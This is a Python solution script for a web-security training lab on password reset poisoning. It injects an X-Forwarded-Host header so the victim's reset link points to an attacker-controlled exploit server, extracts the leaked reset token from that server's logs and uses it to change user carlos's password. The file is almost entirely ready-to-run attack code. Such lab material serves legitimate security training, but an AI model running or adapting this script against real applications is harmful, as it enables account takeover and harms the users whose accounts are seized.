###########################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 30/8/2023
#
# Lab: Password reset poisoning via middleware
#
# Steps: 1. Change the dynamically-generating link of password change
#           functionality via X-Forwarded-Host header to point to your
#           exploit server
#        2. Extract the temporary token from you server logs
#        3. Use the token to change carlos password
#
###########################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


#########################################################
# Function used to change the dynamically-generated link
#########################################################
def change_dynamically_generated_link(url, exploit_domain):
    # set data to send via POST
    data = {
        "username": "carlos"
    }

    # set headers
    headers = {
        "X-Forwarded-Host": exploit_domain
    }

    try:
        # change dynamically-generated link
        res = requests.post(f"{url}/forgot-password", data, headers=headers)
        
    except:
        print(Fore.RED + "Failed to change the link through exception")
        exit(1)

    # if response is OK
    if res.status_code == 200:
        print(Fore.WHITE + "1. Change the dynamically generated link via X-Forwarded-Host header.. OK")
        
        return True
    
    else:
        return False
    


####################################################
#  Function used to issue a change password request
####################################################
def change_password(url, token, new_password):
    # set data to send via POST
    data = {
        "temp-forgot-password-token": token,
        "new-password-1": new_password,
        "new-password-2": new_password,
    }
    
    try:
        # make a change password request
        res = requests.post(f"{url}/forgot-password", data)

    except:
        print(Fore.RED + "Failed to change password through exception")
        exit(1)
    
    print(Fore.WHITE + "3. Changing the password of the carlos.. OK")
    
    # return response
    return res
    


##################################################################
# Function used to extract the token from the exploit sever logs
##################################################################
def extract_token_from_logs(exploit_domain):
    try:
        # fetch the log page
        res = requests.get(f"https://{exploit_domain}/log")

    except:
        print(Fore.RED + "Failed to GET the /log from the server")
        exit(1)

    # search for token in logs
    token = re.findall("temp-forgot-password-token=(.*) HTTP", res.text)
    
    # if token is found
    if len(token) != 0:
        print(Fore.WHITE + "2. Get temp-forgot-password-token of the carlos from exploit sever logs.. OK")
        
        # retuen the last token in the logs
        return token[len(token)-1]
    
    else:
        return None



###########
# Main
###########

# change this to your lab URL
url = "https://0ab0008c03a1daf3814bc67200c500d6.web-security-academy.net"

# change this to your exploit server URL
exploit_domain = "exploit-0ad800a5039ada4c81d6c5080180008c.exploit-server.net"

# try to change the link
is_changed = change_dynamically_generated_link(url, exploit_domain)  

# if the link is changed successfully
if is_changed:  
    # try to extract the token from your server logs
    token = extract_token_from_logs(exploit_domain)
    
    # if you found the token
    if token != None:  
        # set the new password
        # change this to what you want
        new_password = "Hacked"  

        # change the password
        password_changed = change_password(url, token, new_password)

        # if password is changed successfully
        if password_changed.status_code == 200:
            print(Fore.YELLOW + "✅ Password changed to: " + Fore.GREEN + new_password)
    
    else:
        print(Fore.RED + "No tokens are found is the logs")

else:
    print(Fore.RED + "Failed to change the link")
